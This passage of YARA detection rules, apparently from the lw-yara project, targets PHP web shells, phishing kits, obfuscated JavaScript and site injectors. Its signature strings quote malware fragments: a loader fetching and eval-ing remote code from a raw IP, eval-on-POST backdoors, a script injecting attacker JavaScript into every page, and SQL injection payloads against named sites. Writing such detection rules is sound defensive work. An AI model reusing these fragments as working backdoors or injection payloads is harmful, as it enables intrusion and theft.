      $s7 = "yOSUyQ2NvbmNhdCUyOCUyOHNlbGVjdCslMjhzZWxlY3QrJTI4U0VMRUNUK2Rpc3RpbmN0K2NvbmNhdCUyOCcuJHBvbGUuJyUyQzB4MjclMkMweDdlJTI5KycuJGZyb20" ascii /* base64 encoded string '9%2Cconcat%28%28select+%28select+%28SELECT+distinct+concat%28'.$pole.'%2C0x27%2C0x7e%29+'.$from' */
      $s8 = "vdW50JTI4KiUyOSUyQ2NvbmNhdCUyOCUyOHNlbGVjdCslMjhzZWxlY3QrJTI4U0VMRUNUK2Rpc3RpbmN0K2NvbmNhdCUyODB4N2UlMkMweDI3JTJDY291bnQoKiklMkM" ascii /* base64 encoded string 'unt%28*%29%2Cconcat%28%28select+%28select+%28SELECT+distinct+concat%280x7e%2C0x27%2Ccount(*)%2C' */
      $s9 = "vaHR0cDovL20ubG9hZGluZy5zZS9uZXdzLnBocD9wdWJfaWQ9NDE5MjAxMTExMTExMTExMTExMTExMTExMTExMTExMSUyMFVOSU9OJTIwU0VMRUNUJTIwMSwyLDMsNCw" ascii /* base64 encoded string 'http://m.loading.se/news.php?pub_id=4192011111111111111111111111111%20UNION%20SELECT%201,2,3,4,' */
      $s10 = "BU1QoQUdFTlRfSU5URVJWQUwgQVMgQ0hBUiksJyAnKSwnanphcnF0JyxJRk5VTEwoQ0FTVChEQVRFX0NIRUNLIEFTIENIQVIpLCcgJyksJ2p6YXJxdCcsSUZOVUxMKEN" ascii /* base64 encoded string 'ST(AGENT_INTERVAL AS CHAR),' '),'jzarqt',IFNULL(CAST(DATE_CHECK AS CHAR),' '),'jzarqt',IFNULL(C' */
      //$s11 = "tPnJldFsnc2xlZXAnXVsndmFsJ10uY2hyKDApLiInJiYnLyoqLyc9MHgyRjJBMkEyRiYmc2xlZVAoIi4kdGhpcy0+c2VjLiIpJiYnMSIpKSwnaGVhZGVyJywndGltZSc" ascii /* base64 encoded string '>ret['sleep']['val'].chr(0)."'&&'/**/'=0x2F2A2A2F&&sleeP(".$this->sec.")&&'1")),'header','time'' */
      //$s12 = "dLCR0aGlzLT5yZXRbJ3NsZWVwJ11bJ3ZhbCddLiInJiYnLyoqLyc9MHgyRjJBMkEyRiYmYkVuQ0hNQVJLKDI5OTk5OTksTWQ1KG5PVygpKSkmJicxIikpLCdoZWFkZXI" ascii /* base64 encoded string ',$this->ret['sleep']['val']."'&&'/**/'=0x2F2A2A2F&&bEnCHMARK(2999999,Md5(nOW()))&&'1")),'header' */
      //$s13 = "yb3IuJythbmQlMjhzZWxlY3QrMStmcm9tJTI4c2VsZWN0K2NvdW50JTI4KiUyOSUyQ2NvbmNhdCUyOCUyOHNlbGVjdCslMjhzZWxlY3QrJTI4U0VMRUNUK2Rpc3RpbmN" ascii /* base64 encoded string 'or.'+and%28select+1+from%28select+count%28*%29%2Cconcat%28%28select+%28select+%28SELECT+distinc' */
      //$s14 = "nc2xlZXAnXVsna2V5J10sJHRoaXMtPnJldFsnc2xlZXAnXVsndmFsJ10uIicmJicvKiovJz0weDJGMkEyQTJGJiZTbGVlUCgiLiR0aGlzLT5zZWMuIikmJicxIikpLCd" ascii /* base64 encoded string 'sleep']['key'],$this->ret['sleep']['val']."'&&'/**/'=0x2F2A2A2F&&SleeP(".$this->sec.")&&'1")),'' */
      $s15 = "raW5va2x1Ym5pY2hrYS5ydS9uZXdzX3ZpZXcucGhwP25ld3NfaWQ9MiBVTklPTiBBTEwgU0VMRUNUIChTRUxFQ1QgQ09OQ0FUKCdxdmtxcScsSUZOVUxMKENBU1QoQUN" ascii /* base64 encoded string 'inoklubnichka.ru/news_view.php?news_id=2 UNION ALL SELECT (SELECT CONCAT('qvkqq',IFNULL(CAST(AC' */
      $s16 = "oc2VsZWN0K2xlbmd0aCgnLiR2YWx1ZS4nKSsnLiRmcm9tIC4nKycuJHdoZXJlLicrbGltaXQrJy4kbGltaXQuJyksQ0hBUignLiR0aGlzLT5jaGFyY2hlcigifCIpLic" ascii /* base64 encoded string 'select+length('.$value.')+'.$from .'+'.$where.'+limit+'.$limit.'),CHAR('.$this->charcher("|").'' */
      $s17 = "ldFsnc2xlZXAnXVsnZmx0J11bJ3NwJ118fCR0aGlzLT5zZXRbJ3NsZWVwJ11bJ2ZsdCddWydhbiddKSR0aGlzLT5zZXRbJ3NsZWVwJ11bJ2ZsdCddWyd0cCddPXRydWU" ascii /* base64 encoded string 't['sleep']['flt']['sp']||$this->set['sleep']['flt']['an'])$this->set['sleep']['flt']['tp']=true' */
      $s18 = "JJG5ld19jaGVjayA9ICRuZXdfY2hlY2suIiUyZioqJTJmY09uVmVSdChpbnQlMmMoY2hhcigzMyklMmJjaGFyKDEyNiklMmJjaGFyKDMzKSUyYihjaGFyKDY1KSUyYmN" ascii /* base64 encoded string '$new_check = $new_check."%2f**%2fcOnVeRt(int%2c(char(33)%2bchar(126)%2bchar(33)%2b(char(65)%2bc' */
      $s19 = "ST00raW5mb3JtYXRpb25fc2NoZW1hLnNjaGVtYXRhK0xJTUlUKzEpKStmcm9tK2luZm9ybWF0aW9uX3NjaGVtYS50YWJsZXMrbGltaXQrMCwxKSxmbG9vcihyYW5kKDA" ascii /* base64 encoded string 'OM+information_schema.schemata+LIMIT+1))+from+information_schema.tables+limit+0,1),floor(rand(0' */
      $s20 = "hc3Qoc2NoZW1hX25hbWUgYXMgY2hhcikpKSwweDI3LDB4N2UpIGZyb20gYGluZm9ybWF0aW9uX3NjaGVtYWAuc2NoZW1hdGEgbGltaXQgNCwxKSwweDMxMzAzMjM1MzQ" ascii /* base64 encoded string 'st(schema_name as char))),0x27,0x7e) from `information_schema`.schemata limit 4,1),0x3130323534' */
   condition:
      ( uint16(0) == 0x3f3c and
         filesize < 1000KB and
         ( 8 of them )
      ) or ( all of them )
}

rule FOPOobfuscator
{
	meta: 
	author= "Brian Laskowski"
	info= " FOPO Obfuscator detected"

	strings:
		$fopo = "Obfuscation provided by FOPO"
	
	condition:
		$fopo
}
/*
   Yara Rule Set
   Author: Brian Laskowski
   Date: 2018-08-26
   Identifier: shell2
   Reference: https://github.com/Hestat/lw-yara/
*/

/* Rule Set ----------------------------------------------------------------- */

rule infected_08_26_18_shell_fun {
   meta:
      description = "shell2 - file fun.php"
      author = "Brian Laskowski"
      reference = "https://github.com/Hestat/lw-yara/"
      date = "2018-08-26"
      hash1 = "9d095e4f6a3f37c46a1aac4704da957c92fbde23feea3cfd1a0693522e3a73a8"
   strings:
      $s1 = "<?php /* Only For NassRawi , X-SHADOW" fullword ascii
      $s2 = "$OOO000000=urldeCode('" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and
         filesize < 50KB and
         ( all of them )
      ) or ( all of them )
}
/*
   Yara Rule Set
   Author: Brian Laskowski
   Date: 2018-09-03
   Identifier: phish
   Reference: https://github.com/Hestat/lw-yara/
*/

/* Rule Set ----------------------------------------------------------------- */

rule infected_09_03_18_phishing_index {
   meta:
      description = "phish - file index.php"
      author = "Brian Laskowski"
      reference = "https://github.com/Hestat/lw-yara/"
      date = "2018-09-03"
      hash1 = "15b84d95651fa23226d0198fe6fa3d0671221f4a5c44677358c8b125b6667a5a"
   strings:
      $s2 = "$login = $_GET['email'];" fullword ascii
      $s3 = "rename($entry, \"login.php\");" fullword ascii
      $s4 = "$staticfile = \"login.php\";" fullword ascii
      $s5 = "$randomString .= $characters[rand(0, $charactersLength - 1)];" fullword ascii
      $s6 = "header(\"Location: $secfile?rand=13InboxLightaspxn.1774256418&fid.4.1252899642&fid=1&fav.1&rand.13InboxLight.aspxn.1774256418&fi" ascii
      $s7 = "while (false !== ($entry = readdir($handle))) {" fullword ascii
      $s8 = "$dir =  getcwd();" fullword ascii
      $s9 = "//echo $_SESSION[\"file\"].\"\\n\";" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and
         filesize < 3KB and
         ( all of them )
      ) or ( all of them )
}

rule infected_09_03_18_phish_server {
   meta:
      description = "phish - file server.php"
      author = "Brian Laskowski"
      reference = "https://github.com/Hestat/lw-yara/"
      date = "2018-09-03"
      hash1 = "1c9066dd9b1d91a0cc9278629f7f0f8c7a6b9f9e0ebb1e739dd210f7a03ec025"
   strings:
      $s1 = "$ip_data = @json_decode(file_get_contents(\"http://www.geoplugin.net/json.gp?ip=\".$ip));" fullword ascii
      $s2 = "mail($own,$subj,$msg,$headers);" fullword ascii
      $s3 = "<?php"
   condition:
       ( all of them )
}

/*
   Yara Rule Set
   Author: Brian Laskowski
   Date: 2018-08-28
   Identifier: english
   Reference: https://github.com/Hestat/lw-yara/
*/

/* Rule Set ----------------------------------------------------------------- */

rule infected_08_27_18_phishing_english_error {
   meta:
      description = "english - file error.php"
      author = "Brian Laskowski"
      reference = "https://github.com/Hestat/lw-yara/"
      date = "2018-08-28"
      hash1 = "8eb8a7579fc8bc3b9bbad555e93acb58b8eb5eca935c4a645422e7db541bf02b"
   strings:
      $s1 = "<input type=\"hidden\" name=\"login\" value=\"<?php echo $_GET['email']; ?>\">" fullword ascii
      $s2 = "$domain = getDomainFromEmail($login);" fullword ascii
      $s3 = "$loginID = getloginIDFromlogin($login);" fullword ascii
      $s4 = "function getloginIDFromlogin($email)" fullword ascii
      $s5 = "$login = $_GET['email'];" fullword ascii
      $s6 = "$loginID = substr($email, 0, $pos);" fullword ascii
      $s7 = "$ln = strlen($login);" fullword ascii
      $s8 = "$len = strrev($login);" fullword ascii
      $s9 = "return $loginID;" fullword ascii
      $s10 = "6f%7a%2d%62%6f%72%64%65%72%2d%72%61%64%69%75%73%3a%20%34%70%78%3b%20%2d%77%65%62%6b%69%74%2d%62%6f%72%64%65%72%2d%72%61%64%69%75" ascii /* hex encoded string 'oz-border-radius: 4px; -webkit-border-radiu' */
      $s11 = "20%33%70%78%20%23%30%30%30%3b%20%2d%77%65%62%6b%69%74%2d%62%6f%78%2d%73%68%61%64%6f%77%3a%20%33%70%78%20%33%70%78%20%33%70%78%20" ascii /* hex encoded string ' 3px #000; -webkit-box-shadow: 3px 3px 3px ' */
      $s12 = "20%32%70%78%3b%20%2d%77%65%62%6b%69%74%2d%62%6f%72%64%65%72%2d%72%61%64%69%75%73%3a%20%32%70%78%3b%20%2d%6b%68%74%6d%6c%2d%62%6f" ascii /* hex encoded string ' 2px; -webkit-border-radius: 2px; -khtml-bo' */
      $s13 = "78%2d%73%68%61%64%6f%77%3a%20%33%70%78%20%33%70%78%20%33%70%78%20%23%30%30%30%3b%20%2d%77%65%62%6b%69%74%2d%62%6f%78%2d%73%68%61" ascii /* hex encoded string 'x-shadow: 3px 3px 3px #000; -webkit-box-sha' */
      $s14 = "3a%34%35%70%78%3b%20%62%61%63%6b%67%72%6f%75%6e%64%2d%63%6f%6c%6f%72%3a%20%23%30%42%32%31%36%31%3b%20%62%6f%72%64%65%72%3a%20%73" ascii /* hex encoded string ':45px; background-color: #0B2161; border: s' */
      $s15 = "20%34%70%78%3b%20%2d%6b%68%74%6d%6c%2d%62%6f%72%64%65%72%2d%72%61%64%69%75%73%3a%20%34%70%78%3b%20%62%6f%72%64%65%72%2d%72%61%64" ascii /* hex encoded string ' 4px; -khtml-border-radius: 4px; border-rad' */
      $s16 = "2d%62%6f%78%2d%73%68%61%64%6f%77%3a%20%33%70%78%20%33%70%78%20%33%70%78%20%23%30%30%30%3b%20%62%6f%78%2d%73%68%61%64%6f%77%3a%20" ascii /* hex encoded string '-box-shadow: 3px 3px 3px #000; box-shadow: ' */
      $s17 = "79%3a%20%56%65%72%64%61%6e%61%3b%20%66%6f%6e%74%2d%73%69%7a%65%3a%20%31%32%70%78%3b%20%63%6f%6c%6f%72%3a%23%66%66%66%66%66%66%3b" ascii /* hex encoded string 'y: Verdana; font-size: 12px; color:#ffffff;' */
      $s18 = "function getDomainFromEmail($email)" fullword ascii
      $s19 = "// Get the data after the @ sign" fullword ascii
      $s20 = "<?php echo $_GET['email']; ?>" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and
         filesize < 30KB and
         ( 8 of them )
      ) or ( all of them )
}

rule infected_08_27_18_phishing_english_none {
   meta:
      description = "english - file none.php"
      author = "Brian Laskowski"
      reference = "https://github.com/Hestat/lw-yara/"
      date = "2018-08-28"
      hash1 = "b687aff9a134b489ece3dd28cfe006a14718faa050e23827324581e8df514b49"
   strings:
      $s1 = "<?php"
      $s2 = "$ip_data = @json_decode(file_get_contents(\"http://www.geoplugin.net/json.gp?ip=\".$ip));" fullword ascii
      $s3 = "if (empty($login) || empty($passwd)) {" fullword ascii
   condition:
        ( all of them )
}


rule gitignore {
   meta:
      description = "05-26-18 - file gitignore.php"
      author = "Brian Laskowski"
      reference = "https://github.com/Hestat/lw-yara"
      date = "2018-05-29"
      hash1 = "fc881bd0b9fe176b00d0e11d3aed4acc975766676d7ecad01c3776b779615657"
   strings:
      $x1 = "<?php if($_GET[\"login\"]==\"ealJM9\"){$mujj = $_POST[\"z\"]; if ($mujj!=\"\") { $xsser=base64_decode($_POST[\"z0\"]); @eval(\"" ascii
      $s2 = "<?php if($_GET[\"login\"]==\"ealJM9\"){$mujj = $_POST[\"z\"]; if ($mujj!=\"\") { $xsser=base64_decode($_POST[\"z0\"]); @eval(\"" ascii
      $s3 = "xsser;\");} if(@copy($_FILES[\"file\"][\"tmp_name\"], $_FILES[\"file\"][\"name\"])) { echo \"<b>Upload Complate !!!</b><br>\"; }" ascii
   condition:
      ( uint16(0) == 0x3f3c and
         filesize < 1KB and
         ( 1 of ($x*) and all of them )
      ) or ( all of them )
}
/*
   Yara Rule Set
   Author: Brian Laskowski
   Date: 2018-09-20
   Identifier: 09-20-18
   Reference: https://github.com/Hestat/lw-yara/
*/

/* Rule Set ----------------------------------------------------------------- */

rule infected_09_20_18_hand {
   meta:
      description = "09-20-18 - file hand.php"
      author = "Brian Laskowski"
      reference = "https://github.com/Hestat/lw-yara/"
      date = "2018-09-20"
      hash1 = "deb852621f7f6c4ed695b63b625bc4cb2522ff27b95cabbe38fb1d604b1a8c43"
   strings:
      $s1 = "$auth_pass = \"7547ec6af9d987359dd34c888224afb1\"; function s($q, $d){ for($g=0;$g<strlen($q);) for($u=0;$u<strlen($d);$u++, $g+" ascii
      $s2 = "j5Zx5U+UWANCj63AU8/nDM3hOAO7TiDOPFJj2f3W9chN5akuKB6/TcoMsZU7jcFTPEkCZZQEHewMqVaLyLc+yuiKeqk7iOHVHbnAgv/mwhgO31xWVihvg99GwxTZ8XxU" ascii
      $s3 = "57tRMlPPgOrzx0Ecc0qjfDEWWOAWhOIZ5qph46gFw5xiqUAnNFASGNOk2bnuv8QwS3cUxTGjbT6sGpJB1q0SpYg9n72B3j5l40vQpaq7QIkFpYaQZuADG5gXv6kzM43D" ascii
      $s4 = "BxZSk/1FzPL6M+wR1jD1w/95uISlZNV/ZHCGiQTnoST+yGCGI89GiMe4oB8sPYAMALcMg5RPCUcb5aZxEP2x2pXpmpp6aCTmmVFRAq4FR6hzOrfuCrv14ocK/sAsLmtZ" ascii
      $s5 = "mKrFBojP3tjG+nzRrvKfkWK+pJWam+54Msrre9hF28i7v/qOqjiQlnOE6PK2LbNS9Ktt51iRFH3QvHtYtMTmsrmeVMzOBWSDjKa4kh/vfmHn7EiEio6wLP0Clc/IPWtz" ascii
      $s6 = "F7PCikoIwQy8MhEOm3zWS/OGI1JgsQxhrFwPftP4ypELBy5qW0TRPP53SKTLiSjfd0Ry6rYvKKFPtwaVVfok2cXK2lsyMV51o/4ozanwAdWWA7aJaxmVz5GQjOViB4F0" ascii
      $s7 = "N3yzUigx9ucoFXKDbpTZYklmZ9PzCy0EsNdDKMAj7CyZzY+4HuQAX9IdjzfkG8LPboyHN7SRYPQWAzgZY+lG0Nkq/1tEzvDMkl72MSAM3jz1jUIiTY45m4akF9N5jOx6" ascii
      $s8 = "IDeEPSgOUVwBjF4sS2AaFeUT1w5rZAGPaAI8kjDby2dSfGfSPhf5Vx0w8HWE5kc7u9K5EQUVbBC6m9YwFEZpHv1itN/dxvLjIkl79wOwQ8arunk+aIeRA+YGtC2xuCQB" ascii
      $s9 = "MebD6iKaLpiOFaUTHaOQhoVco7eTXEQFGf+hn4tGH63hbPSXWzTql5mFiSnIOTSZzcXe/IhIQE5wMoxfPpQFw+Crmak2rlF6N68fLZ9DEMUQurNNlT66iQWObIvd5vnx" ascii
   condition:
      ( uint16(0) == 0x3f3c and
         filesize < 70KB and
         ( all of them )
      ) or ( all of them )
}

/*
   Yara Rule Set
   Author: Brian Laskowski
   Date: 2018-12-09
   Identifier: 12-09-18
   Reference: https://github.com/Hestat/lw-yara/
   Reference: https://urlscan.io/result/f6ef277d-6340-4ec9-a913-57685ed46f7c/content/
*/

/* Rule Set ----------------------------------------------------------------- */

rule infected_12_09_18_zduF {
   meta:
      description = "12-09-18 - file zduF.js"
      author = "Brian Laskowski"
      reference = "https://github.com/Hestat/lw-yara/"
      date = "2018-12-09"
      hash1 = "52da40de1fd2a0edfc16e393cadf43fe8add12a7aa21e5911b6b8fb21861a44a"
   strings:
      $x1 = "var a=['wrfDgMOxNMOL','bV5/KcKq','OCzCqMK8HA==','wrbDlMKoP3M=','wrDDjcKnesO9','w7DDtcKeJcOf','bloWw7El','wrNWGTJRwqI=','w5LDqsO1" ascii
      $x2 = "':nk['rTQDE'](nk[b('0x138','$A)c')](nk[b('0x139','G$ix')](qM[b('0x13a','2h5Z')](0x0,-0x1),'\\x5c'),qM[b('0x13b','0N7H')](nk['EyZ" ascii
      $s3 = "-\\x5cxa0])+','PDYpG':function(cL,cM){return cL+cM;},'pDdkI':function(cN,cO){return cN+cO;},'RfZME':function(cP,cQ){return cP+cQ" ascii
      $s4 = "script':function(VX){return mc[b('0x9a8','0N7H')](VX),VX;}}}),mc['ajaxPrefilter'](b('0x9a9','I)PN'),function(VY){Z[b('0x9aa','#" fullword ascii
      $s5 = "0x0,Eq)){if(void 0x0!==(lL=DX[b('0x472','%RgQ')](lO,Ej)))return lL;if(Z[b('0x473','alwn')](void 0x0,lL=Z['QpgBA'](E2,lO,Ej)))re" fullword ascii
      $s6 = "nQ===nR;},'YNGvi':function(nS,nT){return Z['LDWZJ'](nS,nT);},'LndXj':function(nU,nV){return Z[b('0xe9','Md2o')](nU,nV);},'Mqvls" fullword ascii
      $s7 = "iI!==iJ;},'LvqDZ':function(iK,iL){return iK!==iL;},'zZWhy':b('0x63','bXFk'),'QExUO':function(iM,iN){return iM in iN;},'HYHkI':f" fullword ascii
      $s8 = "hG(hH);},'BORuX':b('0x5e','9Wj1'),'mgZhk':function(hI,hJ){return hI in hJ;},'pmDad':function(hK,hL,hM){return hK(hL,hM);},'tiAC" fullword ascii
      $s9 = "0x0!==Y['set'](this,lN,Z['LHaXq'])||(this[b('0x82d','vOsz')]=lN));});if(lN)return(Y=mc[b('0x82e','idEd')][lN[b('0x7b9','ZD&B')]" fullword ascii
      $s10 = "eK!==eL;},'cjZjQ':b('0x41','C76^'),'BagAr':function(eM,eN){return eM+eN;},'snKRe':'notify','XTalV':b('0x42','gTz2'),'AbVjH':b('" fullword ascii
      $s11 = "Y,lL=M8[b('0x6ba','XCxy')][this[b('0x6bb','Gtb)')]];return this[b('0x6bc','alwn')][b('0x6bd','#[LR')]?this['pos']=Y=mc[b('0x6be" fullword ascii
      $s12 = "lN||(Y=lL['body']['appendChild'](lL['createElement'](lM)),lN=mc['css'](Y,Z[b('0x4ba','lAp]')]),Y[b('0x4bb','lAp]')]['removeChil" fullword ascii
      $s13 = "Y=PH[b('0x7ed','I)PN')];Y&&(Y[b('0x7ee','alwn')],Y[b('0x7ef','6Igu')]&&Y['parentNode'][b('0x7f0',')P51')]);}}),mc['each']([Z[b(" fullword ascii
      $s14 = "KJ(KK,KL,KM){var lM=EZ[b('0x650','Md2o')](KL);return lM?Math['max'](0x0,lM[0x2]-Z['BxOeg'](KM,0x0))+(lM[0x3]||'px'):KL;}functio" fullword ascii
      $s15 = "vh=vh[b('0x294','gTz2')](qw,qx),function(vn){return vi['ACprV']((vn[b('0x295','&#9B')]||vn[b('0x296','vOsz')]||vi[b('0x297','$A" fullword ascii
      $s16 = "bb(bc);},'HHSrt':function(bd,be,bf,bg,bh){return bd(be,bf,bg,bh);},'UpGAg':function(bi,bj){return bi(bj);},'VFrMV':function(bk," fullword ascii
      $s17 = "w6olZG1bwrUNwpkZwp3Ci8KuwqN1VMKuwpHDjsOxwq/DiDV7wqJgf8O6w7fCjkRsw5DCikw/wp95w4ZiTMKaw5tpD2HDllzCgMKOw63DvwbDtAQVTsK8w7kUZ8O4wqrC" ascii
      $s18 = "3ff&lM|0xdc00);},qy=/([\\0-\\x1f\\x7f]|^-?\\d)|^-$|[^\\0-\\x1f\\x7f-\\uFFFF\\w-]/g,qz=function(qM,qN){return qN?'" fullword ascii
      $s19 = "('0x8d0','GT]j'),'isLocal':Sz['test'](RD[b('0x8d1','jQ3y')]),'global':!0x0,'processData':!0x0,'async':!0x0,'contentType':'applic" ascii
      $s20 = "w5wJw5XCocOCFMO2Oglpwp/CgsKRbcOmw4cpwqfCk8K5wrUNw7fCgsKBw53CtmINw41deRplAi3CrMO5w77DvBHDghFqCx/DrRg8WMKrw7U3wo40wqBdw5vDoi8RGcOD" ascii
   condition:
      ( uint16(0) == 0x6176 and
         filesize < 2000KB and
         ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

/*
   Yara Rule Set
   Author: Brian Laskowski
   Date: 2018-10-28
   Identifier: backdoors
   Reference: https://github.com/Hestat/lw-yara/
   Reference2: https://blog.sucuri.net/2018/10/multiple-ways-to-inject-the-same-tech-support-scam-malware.html
*/

/* Rule Set ----------------------------------------------------------------- */

rule infected_10_29_18_backdoors_script2 {
   meta:
      description = "backdoors - file script2"
      author = "Brian Laskowski"
      reference = "https://github.com/Hestat/lw-yara/"
      date = "2018-10-28"
      hash1 = "6f6ce51207e0a3237cf04fbb0e1b4caa3ea2e78a95bbd1c17e12afa19b3ca2a3"
   strings:
      $s1 = "$c1 = \"http://190.97.167.206/p4.txt\"; $n2 = \"base64_decode\"; $b = \"hjghjerg\"; @file_put _contents($b,\"<?php \".$n2(@file_" ascii
      //$s2 = "tents($c1))); include($b);@unlink($b);@eval($n2(@file_get _contents($c1)));" fullword ascii
   condition:
      ( uint16(0) == 0x6324 and
         filesize < 1KB and
         ( all of them )
      ) or ( all of them )
}

rule infected_10_29_18_backdoors_script3 {
   meta:
      description = "backdoors - file script3"
      author = "Brian Laskowski"
      reference = "https://github.com/Hestat/lw-yara/"
      date = "2018-10-28"
      hash1 = "c0df9c932cf8d9f4aa097ed4d2990fa1415c1ff061b73c535274e8b75fa85017"
   strings:
      $s1 = "$l1 = '<script src=\"https://hotopponents.site/site.js?wtr=1\" type=\"text/javascript\" async></script>';" fullword ascii
      $s2 = "$a = 'find / -type f -name \"*\" | xargs grep -rl \"<head\"';" fullword ascii
      $s3 = "$t = shell_exec($a);" fullword ascii
      $s4 = "105, 116, 101, 47, 115, 105, 116, 101, 46, 106, 115, 63, 119, 116, 114, 61, 50); s0.parentNode.insertBefore(s1,s0); })();';" fullword ascii
      $s5 = "if (strpos($g, '104, 111, 116, 111, 112, 112, 111, 110, 101, 110') !== false || strpos($g, '0xfcc4') !== false) {" fullword ascii
      $s6 = "$g = file_get_contents($f);" fullword ascii
      $s7 = "$a = 'find / -type f -name \"*jquery*js\" | xargs grep -rl \"var\"';" fullword ascii
      $s8 = "$g = str_replace(\"</head>\",$l1.\"</head>\",$g);" fullword ascii
      $s9 = "$l32 = '(function(){ var s1=document.createElement(\"script\"),s0=document.getElementsByTagName(\"script\")[0]; s1.async=true; s" ascii
      $s10 = "$g = str_replace(\"<head>\",\"<head>\".$l1,$g);" fullword ascii
      $s11 = "if (strpos($g, '104, 111, 116, 111, 112, 112, 111, 110, 101, 110') !== false) {" fullword ascii
      $s12 = "if (strpos($g, 'hotopponents') !== false || strpos($g, '0xfcc4') !== false) {" fullword ascii
      $s13 = "echo \"1e:\".$f;" fullword ascii
      $s14 = "$l32 = '(function(){ var s1=document.createElement(\"script\"),s0=document.getElementsByTagName(\"script\")[0]; s1.async=true; s" ascii
      $s15 = "@file_put_contents($f,$g);" fullword ascii
      $s16 = "echo \"e:\".$f;" fullword ascii
   condition:
      ( uint16(0) == 0x6124 and
         filesize < 4KB and
         ( 8 of them )
      ) or ( all of them )
}

rule infected_10_29_18_backdoors_script1 {
   meta:
      description = "backdoors - file script1"
      author = "Brian Laskowski"
      reference = "https://github.com/Hestat/lw-yara/"
      date = "2018-10-28"
      hash1 = "032a86ba3060ecaa285e394913e1e1d36289db6cb56bc01c6cc116e5401daab3"
   strings:
      $s1 = "@file_put _contents('cleartemp','<?php '.base64_decode($_REQUEST['q'])); @include('cleartemp'); @unlink('cleartemp');" fullword ascii
   condition:
      ( uint16(0) == 0x6640 and
         filesize < 1KB and
         ( all of them )
      ) or ( all of them )
}

rule infected_10_29_18_backdoors_script4 {
   meta:
      description = "backdoors - file script4"
      author = "Brian Laskowski"
      reference = "https://github.com/Hestat/lw-yara/"
      date = "2018-10-28"
      hash1 = "6fabfa701da14a21835c61fb7fdbe4db3341528fbedadb696f2bd48c9569d21f"
   strings:
      $s1 = "eyB2YXIgczE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0IiksczA9ZG9jdW1lbnQuZ2V0RWxlbWVudHNCeVRhZ05hbWUoInNjcmlwdCIpWzBdOyBzMS5hc3lu" ascii /* base64 encoded string '{ var s1=document.createElement("script"),s0=document.getElementsByTagName("script")[0]; s1.asyn' */
      $s2 = "Yz10cnVlOyBzMS5zcmM9U3RyaW5nLmZyb21DaGFyQ29kZSgxMDQsIDExNiwgMTE2LCAxMTIsIDExNSwgNTgsIDQ3LCA0NywgMTA0LCAxMTEsIDExNiwgMTExLCAxMTIs" ascii /* base64 encoded string 'c=true; s1.src=String.fromCharCode(104, 116, 116, 112, 115, 58, 47, 47, 104, 111, 116, 111, 112,' */
      $s3 = "IDExMiwgMTExLCAxMTAsIDEwMSwgMTEwLCAxMTYsIDExNSwgNDYsIDExNSwgMTA1LCAxMTYsIDEwMSwgNDcsIDExNSwgMTA1LCAxMTYsIDEwMSwgNDYsIDEwNiwgMTE1" ascii /* base64 encoded string ' 112, 111, 110, 101, 110, 116, 115, 46, 115, 105, 116, 101, 47, 115, 105, 116, 101, 46, 106, 115' */
   condition:
      ( uint16(0) == 0x474a and
         filesize < 6KB and
         ( all of them )
      ) or ( all of them )
}

rule ico_injection_detected
{

    meta:
       author = "Brian Laskowski"
       info = " general ico injection 05/18/18 "

    strings:
    
	$s1="<?php"
	$s2="@include"
	$s3="ic\x6f"

    condition:
    all of them
}

/*
   Yara Rule Set
   Author: Brian Laskowski
   Date: 2019-03-30
   Identifier: 03-30-19
   Reference: https://github.com/Hestat/lw-yara/
*/

/* Rule Set ----------------------------------------------------------------- */

rule infected_03_30_19_index_injection {
   meta:
      description = "03-30-19 - file index.php"
      author = "Brian Laskowski"
      reference = "https://github.com/Hestat/lw-yara/"
      date = "2019-03-30"
      hash1 = "b77081e5e47352abc53201528bede29991279353807673742f75a8406eeb7a3b"
   strings:
      $x1 = "';$bbb6b6b66=explode(\"1l\",\"tilps_gerp1ledocnelru1lemaner1lyarra_ni1lezilairesnu1lstegf1l5dm1lcexe_lruc1lofniphp1lstnetnoc_teg" ascii
      $s2 = "3459234735" ascii /* hex encoded string '4Y#G5' */
      $s3 = "3639556352" ascii /* hex encoded string '69UcR' */
      $s4 = "3639555328" ascii /* hex encoded string '69US(' */
      $s5 = "2850357247" ascii /* hex encoded string '(P5rG' */
      $s6 = "3639556963" ascii /* hex encoded string '69Uic' */
      $s7 = "3639553535" ascii /* hex encoded string '69U55' */
      $s8 = "3459234728" ascii /* hex encoded string '4Y#G(' */
      $s9 = "3626237951" ascii /* hex encoded string '6&#yQ' */
      $s10 = "3639553536" ascii /* hex encoded string '69U56' */
      $s11 = "3344430079" ascii /* hex encoded string '3DCy' */
      $s12 = "3639556864" ascii /* hex encoded string '69Uhd' */
      $s13 = "3639552355" ascii /* hex encoded string '69U#U' */
      $s14 = "3639552352" ascii /* hex encoded string '69U#R' */
      $s15 = "3639555840" ascii /* hex encoded string '69UX@' */
      $s16 = "3522775360" ascii /* hex encoded string '5"wS`' */
      $s17 = "3522775367" ascii /* hex encoded string '5"wSg' */
      $s18 = "3639555071" ascii /* hex encoded string '69UPq' */
      $s19 = "x3c!DOCTYPE html>\\n\\x3chtml>\\n\\x3chead>\\n\\t\\x3cmeta charset=\\\"utf-8\\\">\\n\\t\\x3cmeta http-equiv=\\\"X-UA-Compatible" ascii
      $s20 = "1.0\\r\\nHost:\".$l14yYfXH[\"host\"].\"\\r\\nConnection:Close\\r\\n\\r\\n\");$l1lTyog='';while(!$GLOBALS[\"bbb6b6\"]($l14a)){$l1" ascii
   condition:
      ( uint16(0) == 0x3f3c and
         filesize < 100KB and
         ( 1 of ($x*) and 2 of them )
      ) or ( all of them )
}
/*
   Yara Rule Set
   Author: Brian Laskowski
   Date: 2018-09-25
   Identifier: shell1
   Reference: https://github.com/Hestat/lw-yara/
*/

/* Rule Set ----------------------------------------------------------------- */

rule infected_09_25_18_index {
   meta:
      description = "shell1 - file index.php"
      author = "Brian Laskowski"
      reference = "https://github.com/Hestat/lw-yara/"
      date = "2018-09-25"
      hash1 = "d34230484525def656f5e7124b871515b3fb026d92496b8e89c0d7a0ac0e4ff9"
   strings:
      $s1 = "<?php error_reporting(0); $r=$_SERVER[\"HTTP_USER_AGENT\"];if((preg_match(\"/MSIE 9.0; Windows NT 6.0; Trident\\/5.0/i\",$r)) OR" ascii
      $s2 = "* Joomla! is free software. This version may have been modified pursuant" fullword ascii
